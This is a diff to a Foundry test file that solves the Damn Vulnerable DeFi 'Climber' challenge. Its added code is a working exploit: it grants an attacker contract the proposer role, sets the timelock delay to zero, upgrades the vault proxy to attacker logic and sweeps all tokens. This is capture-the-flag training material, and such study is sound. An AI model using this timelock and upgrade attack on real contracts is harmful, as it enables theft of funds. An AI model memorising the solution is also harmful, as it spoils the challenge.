@@ -9,6 +9,9 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
 
+import {AttackTimelock} from "./AttackTimelock.sol";
+import {AttackVault} from "./AttackVault.sol";
+
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
 
@@ -72,6 +75,59 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(attacker);
+        // Deploy our attacking contract
+        AttackTimelock attackContract = new AttackTimelock( address(climberVaultProxy),
+                                                            payable(climberTimelock),
+                                                            address(dvt), 
+                                                            address(attacker));
+
+        // Deploy contract that will act as new logic contract for vault
+        AttackVault attackVault = new AttackVault();
+
+        // Set attacker contract as proposer for timelock
+        bytes memory grantRoleData =
+            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(attackContract));
+
+        // Update delay to 0
+        bytes memory updateDelayData = abi.encodeWithSignature("updateDelay(uint64)", 0);
+
+        // Call to the vault to upgrade to attacker controlled contract logic
+        bytes memory upgradeData = abi.encodeWithSignature("upgradeTo(address)", address(attackVault));
+
+        // Call Attacking Contract to schedule these actions and sweep funds
+        bytes memory exploitData = abi.encodeWithSignature("exploit()");
+
+        address[] memory toAddress = new address[](4);
+        toAddress[0] = address(climberTimelock);
+        toAddress[1] = address(climberTimelock);
+        toAddress[2] = address(climberVaultProxy);
+        toAddress[3] = address(attackContract);
+
+        bytes[] memory data = new bytes[](4);
+        data[0] = grantRoleData;
+        data[1] = updateDelayData;
+        data[2] = upgradeData;
+        data[3] = exploitData;
+
+        // Set our 4 calls to attacking contract
+        // 1. Set the attack contract to proposer role
+        // 2. Set the timelock delay to 0
+        // 3. Upgrade the vault proxy to the attack vault
+        // 4. Call the exploit function in the attack contract which sets
+        // the schedule for this attack array, sets the sweeper and sweeps all tokens :)
+        attackContract.setScheduleData(toAddress, data);
+
+        uint256[] memory values = new uint256[](4);
+
+        // execute the call in the official climber timelock immediately because we have updated the delay to 0
+        climberTimelock.execute(toAddress, values, data, bytes32(0));
+
+        // withdraw the DVT tokens from the attack contract to the attacker wallet
+        attackContract.withdraw();
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
